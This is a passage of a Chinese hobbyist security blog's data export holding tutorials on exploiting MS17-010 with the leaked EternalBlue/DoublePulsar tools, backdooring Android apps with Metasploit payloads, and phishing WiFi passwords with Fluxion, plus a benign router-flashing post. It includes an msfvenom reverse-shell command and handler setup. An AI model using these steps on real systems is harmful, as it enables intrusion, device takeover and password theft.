Group）的武器库。方程式据称是美国安全局(NSA)下属的组织。</p>\n</blockquote>\n<blockquote>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;早在去年8月份，影子经纪人号称入侵了方程式并且窃取了大量的机密文件，并且公布了一部分机密文件以及0day，当时我也是刚刚找到工作，没怎么关注，当时也是看了一些文章，有一些cisco等路由器设备的0day，造成了后来的数已万计的路由器成肉鸡僵尸网络，ddos美国的域名商，致半个美国的网络瘫痪。<br>","more":"<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ok不多说了，我们来看一下今天公布的0day吧。win10以下所有的windows通杀，而且还是远程溢出攻击直接拿shell，还有传说中的3389远程溢出，是不是在瑟瑟发抖了呢，想想早在高二的时候刚刚入门网络的时候自己还是一个只知道抓鸡的小门生，2003服务器居多，当时多想有一个3389的exp，只要开了3389就可以直接拿下的，如今居然实现了。好了，下面一起来看看这个屌炸天的武器库吧。</p>\n</blockquote>\n<p>ps:这个文章其实可以早一些时间发出来，我这个电脑12年入手的到现在已经跟随了我5年时间，开3个虚拟机太特么卡了，实验到一半就卡死重启，这让我换mbp的心更坚定了。</p>\n<h3 id=\"环境\"><a href=\"#环境\" class=\"headerlink\" title=\"环境\"></a>环境</h3><ul>\n<li>python2.6.6/32位</li>\n<li>pywin32-221.win32-py2.6</li>\n</ul>\n<p>靶机 win7<br><img src=\"/images/pasted-69.jpg\" alt></p>\n<p>攻击者1<br><img src=\"/images/pasted-70.jpg\" alt></p>\n<p>攻击者2<br><img src=\"/images/pasted-71.jpg\" alt></p>\n<h3 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h3><p>下载解压后切换到windows目录执行python fb.py<br><strong><br>默认选项参数特别多，我这里只说重要需要填写的参数</strong></p>\n<p>输入靶机ip和攻击者ip以及选择是否开启本地监听。</p>\n<p><img src=\"/images/pasted-72.jpg\" alt></p>\n<p>创建一个工程项目，名字随意</p>\n<p><img src=\"/images/pasted-73.jpg\" alt></p>\n<p>选择模块，选择Eternalblue模块，输入use Eternalblue</p>\n<p><img src=\"/images/pasted-74.jpg\" alt></p>\n<p>一路回车选择默认的配置，然后到了这一步我们选择目标的系统，以及攻击方式</p>\n<p><img src=\"/images/pasted-75.jpg\" alt></p>\n<p>然后继续一路回车选择默认的配置，直到我们看到了这个 success 就说明成功了。</p>\n<p><img src=\"/images/pasted-76.jpg\" alt></p>\n<p>接下来继续选择攻击方式模块，选择Doublepulsar模块， 输入use Doublepulsar，<br>继续一路回车，然后到这一步选择攻击的服务和目标系统的位数以及攻击方式</p>\n<p><img src=\"/images/pasted-77.jpg\" alt></p>\n<p>然后选择运行我们的payload文件，我们用msf来生成payload文件，在前面的安卓后门一章中也有讲过生成payload。</p>\n<pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.102 LPORT=5554 -f dll &gt; s.dll\n</code></pre><p>如果电脑是32位的就去掉x64/，默认生成的就是32位的</p>\n<p>然后再启动配置msf，并监听反弹的shell。<br><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msf &gt; use exploit/multi/handle</span><br><span class=\"line\">msf exploit(handler) &gt; set PAYLOAD windows/meterpreter/reverse_Tcp</span><br><span class=\"line\">msf exploit(handler) &gt; set LHOST 192.168.1.102</span><br><span class=\"line\">msf exploit(handler) &gt; set LPORT 5554</span><br></pre></td></tr></table></figure></p>\n<p>选择我们的payload之后继续一路回车，然后如果看到了success，就说明溢出成功了。</p>\n<p><img src=\"/images/pasted-78.jpg\" alt></p>\n<p>再来看看我们监听的反弹shell</p>\n<p><img src=\"/images/pasted-79.jpg\" alt></p>\n<p>成功反弹，喜大普奔。</p>\n<h3 id=\"结尾\"><a href=\"#结尾\" class=\"headerlink\" title=\"结尾\"></a>结尾</h3><blockquote>\n<p>可惜我没有服务器，只能做做内网测试。与此同时公布漏洞的十多个小时中，微软终于出了补丁<a href=\"https://blogs.technet.microsoft.com/msrc/2017/04/14/protecting-customers-and-evaluating-risk/\" target=\"_blank\" rel=\"noopener\">(点我)</a><br>并且把此漏洞定为编号MS17-010，win10以下系统更新补丁后的windows将不受影响。</p>\n</blockquote>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><blockquote>\n<p>这个NSA的武器库，不需要做任何操作，只要是联网的，就可以做到指哪儿打哪儿，把远程溢出攻击简化成如此简单。这只是NSA武器库的冰山一角，想想美国的网络安全真的是领先我们几个世纪啊，然而每年各种黑客国际大会比赛几乎都是中国拿的冠军，原来是美国黑客压根就没参加。<br>ps：这个武器库和msf很像，但是感觉没有msf好用，默认选项太多，也许是msf用习惯了吧。</p>\n</blockquote>\n<p>下载地址：</p>\n<blockquote>\n<ul>\n<li><a href=\"https://github.com/x0rz/EQGRP_Lost_in_Translation\" target=\"_blank\" rel=\"noopener\">https://github.com/x0rz/EQGRP_Lost_in_Translation</a></li>\n</ul>\n</blockquote>"},{"layout":"post","title":"路由器刷入breed","date":"2017-04-22T06:03:18.000Z","comments":1,"_content":"\n## 前言\n>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;什么是breed呢，breed又称不死breed，就相当于安卓的rec。和固件是分开的，刷其他固件并不会影响到breed。如果刷的固件不兼容,路由器刷成砖了，就可以通过web进入breed，再刷其他的固件,来恢复路由器。\n\n\n## 正文\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;前几天看到某东做活动，买了一台k2，正式开启了刷路由器之旅，以前也看过很多关于路由器的技术文章，由于一直没有多余的路由器，一直无法实际操作。<!--more-->\n\nk2中有可以官方直刷的breed，所以刷入breed很容易，在路由器后台选择手动升级，然后载入相应的breed的bin文件就ok了\n\n> ![](/images/pasted-88.jpg)\n\n完毕后怎么进入breed呢，拔掉路由器电源，然后电脑网线连接路由器的LAN口，自动获取IP。\n\n按住路由器RESET键，按住不动，然后路由器再插上电源，RESET键持续按住几秒，然后电脑访问192.168.1.1就可以进入breed控制台了。\n\n> ![](/images/pasted-89.jpg)\n\n\nbreed下载地址\n\n * [https://breed.hackpascal.net/ ](https://breed.hackpascal.net/ )","source":"_posts/diary-2017-0422-01.md","raw":"---\nlayout: post\ntitle: 路由器刷入breed\ndate: 2017-04-22 14:03:18\ncomments: true\ntags:\n\t- 路由器\n---\n\n## 前言\n>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;什么是breed呢，breed又称不死breed，就相当于安卓的rec。和固件是分开的，刷其他固件并不会影响到breed。如果刷的固件不兼容,路由器刷成砖了，就可以通过web进入breed，再刷其他的固件,来恢复路由器。\n\n\n## 正文\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;前几天看到某东做活动，买了一台k2，正式开启了刷路由器之旅，以前也看过很多关于路由器的技术文章，由于一直没有多余的路由器，一直无法实际操作。<!--more-->\n\nk2中有可以官方直刷的breed，所以刷入breed很容易，在路由器后台选择手动升级，然后载入相应的breed的bin文件就ok了\n\n> ![](/images/pasted-88.jpg)\n\n完毕后怎么进入breed呢，拔掉路由器电源，然后电脑网线连接路由器的LAN口，自动获取IP。\n\n按住路由器RESET键，按住不动，然后路由器再插上电源，RESET键持续按住几秒，然后电脑访问192.168.1.1就可以进入breed控制台了。\n\n> ![](/images/pasted-89.jpg)\n\n\nbreed下载地址\n\n * [https://breed.hackpascal.net/ ](https://breed.hackpascal.net/ )","slug":"diary-2017-0422-01","published":1,"updated":"2017-04-22T10:55:23.927Z","photos":[],"link":"","_id":"cjvhjxaax000niny203x7rl2j","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><blockquote>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;什么是breed呢，breed又称不死breed，就相当于安卓的rec。和固件是分开的，刷其他固件并不会影响到breed。如果刷的固件不兼容,路由器刷成砖了，就可以通过web进入breed，再刷其他的固件,来恢复路由器。</p>\n</blockquote>\n<h2 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;前几天看到某东做活动，买了一台k2，正式开启了刷路由器之旅，以前也看过很多关于路由器的技术文章，由于一直没有多余的路由器，一直无法实际操作。<a id=\"more\"></a></p>\n<p>k2中有可以官方直刷的breed，所以刷入breed很容易，在路由器后台选择手动升级，然后载入相应的breed的bin文件就ok了</p>\n<blockquote>\n<p><img src=\"/images/pasted-88.jpg\" alt></p>\n</blockquote>\n<p>完毕后怎么进入breed呢，拔掉路由器电源，然后电脑网线连接路由器的LAN口，自动获取IP。</p>\n<p>按住路由器RESET键，按住不动，然后路由器再插上电源，RESET键持续按住几秒，然后电脑访问192.168.1.1就可以进入breed控制台了。</p>\n<blockquote>\n<p><img src=\"/images/pasted-89.jpg\" alt></p>\n</blockquote>\n<p>breed下载地址</p>\n<ul>\n<li><a href=\"https://breed.hackpascal.net/\" target=\"_blank\" rel=\"noopener\">https://breed.hackpascal.net/ </a></li>\n</ul>\n","site":{"data":{}},"excerpt":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><blockquote>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;什么是breed呢，breed又称不死breed，就相当于安卓的rec。和固件是分开的，刷其他固件并不会影响到breed。如果刷的固件不兼容,路由器刷成砖了，就可以通过web进入breed，再刷其他的固件,来恢复路由器。</p>\n</blockquote>\n<h2 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;前几天看到某东做活动，买了一台k2，正式开启了刷路由器之旅，以前也看过很多关于路由器的技术文章，由于一直没有多余的路由器，一直无法实际操作。","more":"</p>\n<p>k2中有可以官方直刷的breed，所以刷入breed很容易，在路由器后台选择手动升级，然后载入相应的breed的bin文件就ok了</p>\n<blockquote>\n<p><img src=\"/images/pasted-88.jpg\" alt></p>\n</blockquote>\n<p>完毕后怎么进入breed呢，拔掉路由器电源，然后电脑网线连接路由器的LAN口，自动获取IP。</p>\n<p>按住路由器RESET键，按住不动，然后路由器再插上电源，RESET键持续按住几秒，然后电脑访问192.168.1.1就可以进入breed控制台了。</p>\n<blockquote>\n<p><img src=\"/images/pasted-89.jpg\" alt></p>\n</blockquote>\n<p>breed下载地址</p>\n<ul>\n<li><a href=\"https://breed.hackpascal.net/\" target=\"_blank\" rel=\"noopener\">https://breed.hackpascal.net/ </a></li>\n</ul>"},{"layout":"post","title":"向安卓app中注入payload后门","date":"2017-04-25T09:08:41.000Z","comments":1,"_content":"\n\n\n### 前言\n><font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！**</font>\n>\n\n\n### 正文\n\n在前面的文章中我有说到过如何向android植入后门app，我们用的方法是使用msf生成一个payload，需要用户单独安装后才行。[(点我)](https://y00z.github.io/2016/12/19/diary-2016-1219-01/)<!--more-->\n那么可不可以向一个正常的app注入payload呢，当然是可以的。原理就是反编译app,然后在app中注入payload代码，然后再重新编译打包。前提是app没有做过一些加固等操作.\n\n\n在msf中就提供了这样注入方式。\n\n![](/images/pasted-98.jpg)\n\n会对该app进行反编译，然后会找到可以注入载荷的钩子点。进一步，它会利用可用于后渗透活动的附加权限使该app的Android清单文件染毒。\n\n![](/images/pasted-99.jpg)\n\n这里呢，我使用[backdoor-apk](https://github.com/dana-at-cp/backdoor-apk)来向app注入payload\n\n![](/images/pasted-101.jpg)\n\n其中有3个选项，\n * 选择反弹的payload\n * 监听的ip\n * 监听的端口\n\n完毕之后染毒的apk在original/dist目录中，并且会在本地生成一个backdoor-apk.rc文件。\n\nbackdoor-apk.rc里面包含着msf的所有配置，所以我们可以直接启动msf并且指定backdoor-apk.rc文件即可。会自动帮我们把msf配置好\n\n![](/images/pasted-102.jpg)\n\n手机安装上染毒的apk，msf成功收到反弹到一个会话\n\n![](/images/pasted-103.jpg)","source":"_posts/diary-2017-0425-01.md","raw":"---\nlayout: post\ntitle: 向安卓app中注入payload后门\ndate: 2017-04-25 17:08:41\ncomments: true\ntags:\n\t- 安全攻防\n\t- 安卓\n---\n\n\n\n### 前言\n><font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！**</font>\n>\n\n\n### 正文\n\n在前面的文章中我有说到过如何向android植入后门app，我们用的方法是使用msf生成一个payload，需要用户单独安装后才行。[(点我)](https://y00z.github.io/2016/12/19/diary-2016-1219-01/)<!--more-->\n那么可不可以向一个正常的app注入payload呢，当然是可以的。原理就是反编译app,然后在app中注入payload代码，然后再重新编译打包。前提是app没有做过一些加固等操作.\n\n\n在msf中就提供了这样注入方式。\n\n![](/images/pasted-98.jpg)\n\n会对该app进行反编译，然后会找到可以注入载荷的钩子点。进一步，它会利用可用于后渗透活动的附加权限使该app的Android清单文件染毒。\n\n![](/images/pasted-99.jpg)\n\n这里呢，我使用[backdoor-apk](https://github.com/dana-at-cp/backdoor-apk)来向app注入payload\n\n![](/images/pasted-101.jpg)\n\n其中有3个选项，\n * 选择反弹的payload\n * 监听的ip\n * 监听的端口\n\n完毕之后染毒的apk在original/dist目录中，并且会在本地生成一个backdoor-apk.rc文件。\n\nbackdoor-apk.rc里面包含着msf的所有配置，所以我们可以直接启动msf并且指定backdoor-apk.rc文件即可。会自动帮我们把msf配置好\n\n![](/images/pasted-102.jpg)\n\n手机安装上染毒的apk，msf成功收到反弹到一个会话\n\n![](/images/pasted-103.jpg)","slug":"diary-2017-0425-01","published":1,"updated":"2017-07-13T11:02:27.407Z","photos":[],"link":"","_id":"cjvhjxaay000oiny2xadkl00r","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><blockquote>\n<font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！</strong></font>\n\n</blockquote>\n<h3 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h3><p>在前面的文章中我有说到过如何向android植入后门app，我们用的方法是使用msf生成一个payload，需要用户单独安装后才行。<a href=\"https://y00z.github.io/2016/12/19/diary-2016-1219-01/\">(点我)</a><a id=\"more\"></a><br>那么可不可以向一个正常的app注入payload呢，当然是可以的。原理就是反编译app,然后在app中注入payload代码，然后再重新编译打包。前提是app没有做过一些加固等操作.</p>\n<p>在msf中就提供了这样注入方式。</p>\n<p><img src=\"/images/pasted-98.jpg\" alt></p>\n<p>会对该app进行反编译，然后会找到可以注入载荷的钩子点。进一步，它会利用可用于后渗透活动的附加权限使该app的Android清单文件染毒。</p>\n<p><img src=\"/images/pasted-99.jpg\" alt></p>\n<p>这里呢，我使用<a href=\"https://github.com/dana-at-cp/backdoor-apk\" target=\"_blank\" rel=\"noopener\">backdoor-apk</a>来向app注入payload</p>\n<p><img src=\"/images/pasted-101.jpg\" alt></p>\n<p>其中有3个选项，</p>\n<ul>\n<li>选择反弹的payload</li>\n<li>监听的ip</li>\n<li>监听的端口</li>\n</ul>\n<p>完毕之后染毒的apk在original/dist目录中，并且会在本地生成一个backdoor-apk.rc文件。</p>\n<p>backdoor-apk.rc里面包含着msf的所有配置，所以我们可以直接启动msf并且指定backdoor-apk.rc文件即可。会自动帮我们把msf配置好</p>\n<p><img src=\"/images/pasted-102.jpg\" alt></p>\n<p>手机安装上染毒的apk，msf成功收到反弹到一个会话</p>\n<p><img src=\"/images/pasted-103.jpg\" alt></p>\n","site":{"data":{}},"excerpt":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><blockquote>\n<font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！</strong></font>\n\n</blockquote>\n<h3 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h3><p>在前面的文章中我有说到过如何向android植入后门app，我们用的方法是使用msf生成一个payload，需要用户单独安装后才行。<a href=\"https://y00z.github.io/2016/12/19/diary-2016-1219-01/\">(点我)</a>","more":"<br>那么可不可以向一个正常的app注入payload呢，当然是可以的。原理就是反编译app,然后在app中注入payload代码，然后再重新编译打包。前提是app没有做过一些加固等操作.</p>\n<p>在msf中就提供了这样注入方式。</p>\n<p><img src=\"/images/pasted-98.jpg\" alt></p>\n<p>会对该app进行反编译，然后会找到可以注入载荷的钩子点。进一步，它会利用可用于后渗透活动的附加权限使该app的Android清单文件染毒。</p>\n<p><img src=\"/images/pasted-99.jpg\" alt></p>\n<p>这里呢，我使用<a href=\"https://github.com/dana-at-cp/backdoor-apk\" target=\"_blank\" rel=\"noopener\">backdoor-apk</a>来向app注入payload</p>\n<p><img src=\"/images/pasted-101.jpg\" alt></p>\n<p>其中有3个选项，</p>\n<ul>\n<li>选择反弹的payload</li>\n<li>监听的ip</li>\n<li>监听的端口</li>\n</ul>\n<p>完毕之后染毒的apk在original/dist目录中，并且会在本地生成一个backdoor-apk.rc文件。</p>\n<p>backdoor-apk.rc里面包含着msf的所有配置，所以我们可以直接启动msf并且指定backdoor-apk.rc文件即可。会自动帮我们把msf配置好</p>\n<p><img src=\"/images/pasted-102.jpg\" alt></p>\n<p>手机安装上染毒的apk，msf成功收到反弹到一个会话</p>\n<p><img src=\"/images/pasted-103.jpg\" alt></p>"},{"layout":"post","title":"wifi破解之社工钓鱼","date":"2017-05-07T13:02:11.000Z","comments":1,"_content":"\n\n### 前言\n><font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！**</font>\n\n### 正文\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wifi有很多种方法，我在之前的文章中说过抓握手包破解，这里说一下社工钓鱼来破解得到wifi密码。<!--more-->\n\n#### 攻击原理\n\n * 抓取握手包\n * 创建一个和目标wifi同名的ap热点，\n * 开启一个web服务，创建一个钓鱼的web页面，要求用户输入wifi密码\n * 模拟dns服务，把所有的请求都解析到自己的ip中\n * ddos目标ap，使用户连不上路由器\n * 用户连接不上wifi后就会自动连上我们的钓鱼wifi\n * 连上后就所有请求页面都会转到我们的钓鱼页面。\n * 用户输入wifi密码后通过抓取的握手包来匹配正确密码。\n\n\n**这里我们使用Fluxion（当然也有相同的WiFiPhisher）来完成上述的过程**\n\n### 安装\n\n首先把程序下载到本地\n\n\tgit clone https://github.com/FluxionNetwork/fluxion.git\n\n首先进入install目录中运行install，会自动把依赖的软件包自动安装好。  **↓**\n\n ![](/images/pasted-106.jpg)\n\n### 攻击\n\n安装完毕之后就可以直接开启fluxion了。  **↓**\n\n ![](/images/pasted-107.jpg)\n\n一开始选择语言，其中有中文，但是我还是建议使用英文的。\n\n选择语言后来扫描指定ap的信道。 **↓**\n\n ![](/images/pasted-108.jpg)\n\n第一个是扫描全部信道，第二个是扫描指定信道，我们选择扫描全部信道。\n\n选择之后会自动开启一个小窗口来扫描ap，如果扫描到了我们要的ap就ctrl+c强制停止掉。   **↓**\n\n ![](/images/pasted-109.jpg)\n\n停止扫描后会把刚刚我们扫描到的ap都显示出来，选择我们需要攻击的ap。    **↓**\n\n ![](/images/pasted-110.jpg)\n\n然后选择攻击方式。   **↓**\n\n![](/images/pasted-111.jpg)\n\n第一个就是我上面说的伪装ap攻击。我们选第一个。\n\n选择后我们需要设置保存握手包保存路径。  **↓**\n\n![](/images/pasted-112.jpg)\n\n我们可以选择默认路径，直接回车。\n\n然后选择抓取握手包的方式。 **↓**\n\n![](/images/pasted-113.jpg)\n\n选择我们攻击ap的方式，第一个是使用默认aireplay来攻所有的客户端，第二个则是使用mdk3来攻击所有的客户端。\n\n![](/images/pasted-114.jpg)\n\n选择之后会同时开启2个小窗口，一个来ddos攻击ap，第二个来抓取握手包。  **↓**\n\n![](/images/pasted-115.jpg)\n\n如果抓取到握手包了右上角会有显示。 **↓**\n\n![](/images/pasted-116.jpg)\n\n这个时候可以直接关掉小窗口了，然后查看握手包。    **↓**\n\n![](/images/pasted-117.jpg)\n\n来创建一个ssl证书。**↓**\n\n![](/images/pasted-118.jpg)\n\n开启web服务。**↓**\n\n![](/images/pasted-119.jpg)\n\n选择路由器的登录界面，在我们国内使用的tp-link比较多，我们可以选择tp-link。 **↓**\n\n![](/images/pasted-120.jpg)\n\n完毕之后会同时开启4个窗口，一个dhcp来分配ip，一个用来监听连接进钓鱼ap的客户端，一个来把所有请求解析到本地，最后一个来ddos目标的wifi。 **↓**\n\n![](/images/pasted-121.jpg)\n\n这个时候的客户端呢，用户会连接不上原wifi，而会自动连上我们的钓鱼wifi，而且一连上wifi就会自动打开网页，进入我们的钓鱼页面。 **↓**\n\n![](/images/Screenshot_2017-05-07-22-04-22.jpg)\n\n同时浏览器也会提示用户登录wifi。  **↓**\n\n![](/images/Screenshot_2017-05-07-22-04-16.jpg)\n\n用户输入密码后，会根据抓到的握手包来匹配正确密码。 **↓**\n\n![](/images/Screenshot_2017-05-07-22-05-20.jpg)\n\n直到用户输入正确密码后，程序停止。\n\n![](/images/Screenshot_2017-05-07-22-05-50.jpg)\n\n![](/images/pasted-122.jpg)\n\n\n### 末尾\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;另外破解wifi还有使用reaver来穷举pin码，只有ap开着wps，并且没有做防pin的处理，那么可以百分百破解得到密码。但是不知道是不是我这个网卡原因，一直pin失败，所有ap都是一样的。等我解决这个问题后再来发布关于pin码的文章好了。","source":"_posts/diary-2017-0507-01.md","raw":"---\nlayout: post\ntitle: wifi破解之社工钓鱼\ndate: 2017-05-07 21:02:11\ncomments: true\ntags:\n\t- 安全攻防\n\t- wifi破解\n---\n\n\n### 前言\n><font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！**</font>\n\n### 正文\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wifi有很多种方法，我在之前的文章中说过抓握手包破解，这里说一下社工钓鱼来破解得到wifi密码。<!--more-->\n\n#### 攻击原理\n\n * 抓取握手包\n * 创建一个和目标wifi同名的ap热点，\n * 开启一个web服务，创建一个钓鱼的web页面，要求用户输入wifi密码\n * 模拟dns服务，把所有的请求都解析到自己的ip中\n * ddos目标ap，使用户连不上路由器\n * 用户连接不上wifi后就会自动连上我们的钓鱼wifi\n * 连上后就所有请求页面都会转到我们的钓鱼页面。\n * 用户输入wifi密码后通过抓取的握手包来匹配正确密码。\n\n\n**这里我们使用Fluxion（当然也有相同的WiFiPhisher）来完成上述的过程**\n\n### 安装\n\n首先把程序下载到本地\n\n\tgit clone https://github.com/FluxionNetwork/fluxion.git\n\n首先进入install目录中运行install，会自动把依赖的软件包自动安装好。  **↓**\n\n ![](/images/pasted-106.jpg)\n\n### 攻击\n\n安装完毕之后就可以直接开启fluxion了。  **↓**\n\n ![](/images/pasted-107.jpg)\n\n一开始选择语言，其中有中文，但是我还是建议使用英文的。\n\n选择语言后来扫描指定ap的信道。 **↓**\n\n ![](/images/pasted-108.jpg)\n\n第一个是扫描全部信道，第二个是扫描指定信道，我们选择扫描全部信道。\n\n选择之后会自动开启一个小窗口来扫描ap，如果扫描到了我们要的ap就ctrl+c强制停止掉。   **↓**\n\n ![](/images/pasted-109.jpg)\n\n停止扫描后会把刚刚我们扫描到的ap都显示出来，选择我们需要攻击的ap。    **↓**\n\n ![](/images/pasted-110.jpg)\n\n然后选择攻击方式。   **↓**\n\n![](/images/pasted-111.jpg)\n\n第一个就是我上面说的伪装ap攻击。我们选第一个。\n\n选择后我们需要设置保存握手包保存路径。  **↓**\n\n![](/images/pasted-112.jpg)\n\n我们可以选择默认路径，直接回车。\n\n然后选择抓取握手包的方式。 **↓**\n\n![](/images/pasted-113.jpg)\n\n选择我们攻击ap的方式，第一个是使用默认aireplay来攻所有的客户端，第二个则是使用mdk3来攻击所有的客户端。\n\n![](/images/pasted-114.jpg)\n\n选择之后会同时开启2个小窗口，一个来ddos攻击ap，第二个来抓取握手包。  **↓**\n\n![](/images/pasted-115.jpg)\n\n如果抓取到握手包了右上角会有显示。 **↓**\n\n![](/images/pasted-116.jpg)\n\n这个时候可以直接关掉小窗口了，然后查看握手包。    **↓**\n\n![](/images/pasted-117.jpg)\n\n来创建一个ssl证书。**↓**\n\n![](/images/pasted-118.jpg)\n\n开启web服务。**↓**\n\n![](/images/pasted-119.jpg)\n\n选择路由器的登录界面，在我们国内使用的tp-link比较多，我们可以选择tp-link。 **↓**\n\n![](/images/pasted-120.jpg)\n\n完毕之后会同时开启4个窗口，一个dhcp来分配ip，一个用来监听连接进钓鱼ap的客户端，一个来把所有请求解析到本地，最后一个来ddos目标的wifi。 **↓**\n\n![](/images/pasted-121.jpg)\n\n这个时候的客户端呢，用户会连接不上原wifi，而会自动连上我们的钓鱼wifi，而且一连上wifi就会自动打开网页，进入我们的钓鱼页面。 **↓**\n\n![](/images/Screenshot_2017-05-07-22-04-22.jpg)\n\n同时浏览器也会提示用户登录wifi。  **↓**\n\n![](/images/Screenshot_2017-05-07-22-04-16.jpg)\n\n用户输入密码后，会根据抓到的握手包来匹配正确密码。 **↓**\n\n![](/images/Screenshot_2017-05-07-22-05-20.jpg)\n\n直到用户输入正确密码后，程序停止。\n\n![](/images/Screenshot_2017-05-07-22-05-50.jpg)\n\n![](/images/pasted-122.jpg)\n\n\n### 末尾\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;另外破解wifi还有使用reaver来穷举pin码，只有ap开着wps，并且没有做防pin的处理，那么可以百分百破解得到密码。但是不知道是不是我这个网卡原因，一直pin失败，所有ap都是一样的。等我解决这个问题后再来发布关于pin码的文章好了。","slug":"diary-2017-0507-01","published":1,"updated":"2017-06-06T10:46:12.959Z","photos":[],"link":"","_id":"cjvhjxaay000piny28mnj1vcl","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><blockquote>\n<font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！</strong></font>\n</blockquote>\n<h3 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wifi有很多种方法，我在之前的文章中说过抓握手包破解，这里说一下社工钓鱼来破解得到wifi密码。<a id=\"more\"></a></p>\n<h4 id=\"攻击原理\"><a href=\"#攻击原理\" class=\"headerlink\" title=\"攻击原理\"></a>攻击原理</h4><ul>\n<li>抓取握手包</li>\n<li>创建一个和目标wifi同名的ap热点，</li>\n<li>开启一个web服务，创建一个钓鱼的web页面，要求用户输入wifi密码</li>\n<li>模拟dns服务，把所有的请求都解析到自己的ip中</li>\n<li>ddos目标ap，使用户连不上路由器</li>\n<li>用户连接不上wifi后就会自动连上我们的钓鱼wifi</li>\n<li>连上后就所有请求页面都会转到我们的钓鱼页面。</li>\n<li>用户输入wifi密码后通过抓取的握手包来匹配正确密码。</li>\n</ul>\n<p><strong>这里我们使用Fluxion（当然也有相同的WiFiPhisher）来完成上述的过程</strong></p>\n<h3 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h3><p>首先把程序下载到本地</p>\n<pre><code>git clone https://github.com/FluxionNetwork/fluxion.git\n</code></pre><p>首先进入install目录中运行install，会自动把依赖的软件包自动安装好。  <strong>↓</strong></p>\n<p> <img src=\"/images/pasted-106.jpg\" alt></p>\n<h3 id=\"攻击\"><a href=\"#攻击\" class=\"headerlink\" title=\"攻击\"></a>攻击</h3><p>安装完毕之后就可以直接开启fluxion了。  <strong>↓</strong></p>\n<p> <img src=\"/images/pasted-107.jpg\" alt></p>\n<p>一开始选择语言，其中有中文，但是我还是建议使用英文的。</p>\n<p>选择语言后来扫描指定ap的信道。 <strong>↓</strong></p>\n<p> <img src=\"/images/pasted-108.jpg\" alt></p>\n<p>第一个是扫描全部信道，第二个是扫描指定信道，我们选择扫描全部信道。</p>\n<p>选择之后会自动开启一个小窗口来扫描ap，如果扫描到了我们要的ap就ctrl+c强制停止掉。   <strong>↓</strong></p>\n<p> <img src=\"/images/pasted-109.jpg\" alt></p>\n<p>停止扫描后会把刚刚我们扫描到的ap都显示出来，选择我们需要攻击的ap。    <strong>↓</strong></p>\n<p> <img src=\"/images/pasted-110.jpg\" alt></p>\n<p>然后选择攻击方式。   <strong>↓</strong></p>\n<p><img src=\"/images/pasted-111.jpg\" alt></p>\n<p>第一个就是我上面说的伪装ap攻击。我们选第一个。</p>\n<p>选择后我们需要设置保存握手包保存路径。  <strong>↓</strong></p>\n<p><img src=\"/images/pasted-112.jpg\" 